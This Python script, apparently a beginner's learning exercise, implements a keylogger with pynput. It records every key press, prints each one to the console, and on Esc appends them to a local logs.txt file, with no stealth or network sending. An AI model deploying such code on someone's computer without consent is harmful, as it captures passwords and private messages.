from pynput import keyboard  #imports the pynput library


class Keylogger:
    def __init__(self):
        self.logs = []   #an empty list to log keyboard presses
        self.listener = keyboard.Listener(on_press=self.on_press)  #an listener from the pynput package that listens to keyboard presses
    
    
    def on_press(self, key):
        try: 
            print('alphanumeric key {0} pressed'.format(key.char))  #print what key has been pressed in char format (for debug)
            self.logs.append(key.char)      #appends the key pressed into the self.log list 
            
        except AttributeError:
            print('special key {0} pressed'.format(key))   #used for error checking and terminal documentation of code working (for debug)
            self.logs.append(" " + str(key) + " ")        #appends any special character keys suck as shift and enter that cannot use .char format
            if key == keyboard.Key.esc:             #adds a if statment that quits out of function if esc key is pressed
                quit()

            
            
    def listen(self):                   
         with self.listener as listener:     #creates the listening function that listens for keyboard presses and then stores them in blocks until process is stopped 
            listener.join()

class Write_to_File:
    
    def __init__(self, logFile):           
       self.logFile = logFile              #creates an attribute to be used be writing function with argument from Write_to_file class
        
    def writing(self, logs):
        with open(self.logFile, "a") as file:  #creates and opens a file which is named after what logFile has stored, then writes and appends logs of keystrokes to file, closing file afterwards
            file.write(logs + '\n')
            
def main():
    logFile = "logs.txt"                 #creates object with name of log file
    writetoFile = Write_to_File(logFile)        #creats object with Write_to_file class
    keyLogger = Keylogger()         #creates object with Keylogger class
    
    try:
        print("Keylogger started. Press 'Esc' key to stop.")       #starts keylogger and beings lsitening to keystrokes and running keylogger class (for debug)
        keyLogger.listen()    #starts keylogger listener 
        
    except:
        pass        #passes exception
    finally:
        logs_to_Write = "".join(keyLogger.logs)        #after listener is quit with esc key, creates object and joins logs list from keylogger
        writetoFile.writing(logs_to_Write)        #calls writing function from Write_to_File class to write logs_to_Write to file
        print(f"Key logs saved to {logFile}")       #records that logs have been save to the logFile (for debug)

if __name__ == "__main__":
    main()                              #executes main function
    f = open("logs.txt", "r")           #opens logs.txt file and reads file (for debug)
    print(f.read())             #prints out read logs.txt file (for debug)
    
    
    
    

           






